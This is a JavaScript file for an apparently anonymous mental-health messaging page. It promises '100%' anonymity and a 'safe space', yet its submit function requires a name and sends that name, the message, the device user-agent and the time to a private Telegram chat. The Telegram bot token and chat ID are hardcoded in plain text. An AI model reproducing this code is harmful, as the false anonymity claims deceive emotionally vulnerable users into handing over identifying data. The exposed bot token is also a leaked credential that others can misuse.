function toggleMenu() {
  const menu = document.getElementById('menuList');
  menu.classList.toggle('hidden');
}

function showInfo(type) {
  const content = {
    about: "This site was built to create a safe anonymous space for emotional expression.",
    terms: "Terms & Conditions coming soon.",
    privacy: "Your data is handled respectfully. This is a safe space.",
    support: "Contact: support@mentalconnect.help",
    faq: "Q: Is this really anonymous? A: Yes, 100%.",
    feedback: "We welcome your feedback. Thank you ❤️",
    rate: "Rate us later maybe 😋"
  };
  const modal = document.getElementById('popupModal');
  modal.innerHTML = `
    <div style="background:#222;padding:20px;border-radius:10px;">
      <p>${content[type]}</p>
      <button onclick="modal.classList.add('hidden')">Close</button>
    </div>`;
  modal.classList.remove('hidden');
}

function likeVenky() {
  alert("❤️ Thank you for supporting Venky!");
}

function dislikeVenky() {
  alert("🖤 It's okay... he's still here listening.");
}

function recordAudio() {
  alert("🎤 Audio feature coming soon!");
}

function submitMessage() {
  const msg = document.getElementById('userMessage').value.trim();
  if (!msg) {
    alert("Please type a message first.");
    return;
  }

  const name = prompt("Before sending, enter your name (it’ll still be anonymous)");
  if (!name) {
    alert("Name required to send message.");
    return;
  }

  const payload = `
📩 *New Anonymous Message*
———————————————
👤 Name: ${name}
💬 Message: ${msg}
📱 Device: ${navigator.userAgent}
🕒 Time: ${new Date().toLocaleString()}
`;

  // ✅ Send to Bot 1 via Telegram API
  const botToken = "8133185989:AAHDUtLI3oeY_3Og8_Gne_Fyq3OgWC9qIW0";
  const chatId = "7244443820"; // your personal Telegram ID

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: payload,
      parse_mode: "Markdown"
    }),
  })
    .then((res) => {
      alert("✅ Message sent anonymously. Thank you.");
      document.getElementById('userMessage').value = "";
    })
    .catch((err) => {
      console.error(err);
      alert("⚠️ Failed to send message.");
    });
}

function exitToInstagram() {
  alert("📸 Redirecting to Instagram...");
  window.location.href = "https://instagram.com/_venky__21";
}
